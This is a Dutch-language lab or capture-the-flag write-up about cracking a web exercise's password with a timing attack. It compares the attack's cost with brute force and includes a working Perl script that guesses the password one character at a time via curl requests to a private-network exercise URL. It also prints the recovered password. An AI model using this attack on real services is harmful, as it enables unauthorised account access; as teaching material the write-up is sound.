\begin{enumerate}
\item Bij het manueel ingeven van letters zien we dat het ingeven van een foute letter ons 3-4 seconden laat wachten.
\item Gewoon voor de fun even de wiskunde van een timing attack versus een brute force approach:
\item Gegeven: wachtwoord van 10 tekens, foute invoer = 3 seconden wachten
	\begin{enumerate}
	\item Timing attack:
		\begin{enumerate}
		\item Slechtste geval: 3 seconden * 61 (a-zA-Z0-9) = 183 seconden per teken
		\item 10 tekens = 1830 seconden = +/- half uur
		\end{enumerate}
	\item Brute force
		\begin{enumerate}
		\item Slechtste geval: 62\textsuperscript{10} = 839299365868340224 mogelijkheden
		\item Eentje is juist: 839299365868340224 - 1 = 839299365868340223
		\item 839299365868340223 * 3 seconden = 2517898097605020669 seconden =~ 80 miljard jaar
		\end{enumerate}
	\end{enumerate}
\item Het oplossen van dit probleem doen we door middel van het schrijven van een script.
\end{enumerate}

\begin{lstlisting}
Elk teken wordt doorlopen, telkens plakken we er de script-parameter aan toe.
We meten de tijd, doen daarna ons request naar de site en meten de tijd opnieuw.
Als het verschil kleiner is dan 3 seconden, dan hebben we de correcte letter gevonden en begint het script.

Perl script:
------------

use Time::HiRes qw/ time sleep /;
@abc = ("a".."z", "A".."Z", 0..9);
foreach (@abc) {
	$wachtwoord = $ARGV[0] . $_;
	$start = time;
	$res = `curl -s -k -d 'oplossing=$wachtwoord' https://192.168.255.130/oefeningen/oplossing/web-based/19/`;
	$eind = time;
	$verschil = $eind - $start;
	
	if ($verschil < 3) {
		print "\n$wachtwoord\n";
		exit 1;
	}
	
	print ".";
}

Uitvoering: 
-----------

perl script.pl

Het script geeft 'n' als resultaat. Daarna voeren we uit:
	perl script.pl n
	
En krijgen we mogelijk 'ny' als resultaat. Daarna voeren we uit:
	perl script.pl ny
	
...

Uiteindelijk vinden we: nyL0csPv7P
\end{lstlisting}